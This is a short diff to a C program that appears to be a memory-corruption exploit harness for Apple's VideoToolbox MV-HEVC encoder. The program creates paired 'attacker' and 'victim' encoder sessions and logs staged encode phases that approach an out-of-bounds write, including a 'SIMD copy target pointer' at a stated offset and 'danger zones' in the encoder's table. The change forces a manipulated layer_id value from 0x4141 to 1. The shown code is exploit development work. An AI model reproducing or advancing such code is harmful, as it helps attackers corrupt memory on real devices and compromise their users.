@@ -834,8 +834,9 @@ int main(int argc, char *argv[]) {
         }
         usleep(100000);
 
-        rlog("\n--- Phase C: Create attacker (lid=0x4141) + victim (lid=1) ---\n");
-        VTCompressionSessionRef attacker = create_mvhevc_encoder(1920, 1080, 0x4141);
+        rlog("\n--- Phase C: Create attacker (lid=1) + victim (lid=1) ---\n");
+        rlog("Note: layer_id forced to 1 for stereo encode (tags must match)\n");
+        VTCompressionSessionRef attacker = create_mvhevc_encoder(1920, 1080, 1);
         VTCompressionSessionRef victim = create_mvhevc_encoder(1920, 1080, 1);
         if (!attacker || !victim) {
             rlog("FAILED to create attacker/victim\n");
@@ -1006,8 +1007,8 @@ int main(int argc, char *argv[]) {
         rlog("  Entry 592 (+0x5C70, ~148 enc): SIMD copy target pointer\n");
         rlog("Strategy: batch to 63 (pre-OOB), then one-at-a-time through danger zones.\n\n");
         if (phase1_verify() != 0) goto done;
-        int ct_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
-        rlog("layer_id=0x%x\n", ct_lid);
+        int ct_lid = 1;
+        rlog("layer_id=0x%x (forced to 1 for stereo — tags must match session config)\n", ct_lid);
         VTCompressionSessionRef ct_s = create_mvhevc_encoder(1920, 1080, ct_lid);
         if (!ct_s) { rlog("FAILED: encoder creation\n"); goto done; }
         rlog("Phase A: Pre-OOB baseline (63 encodes, ~252 entries)\n");
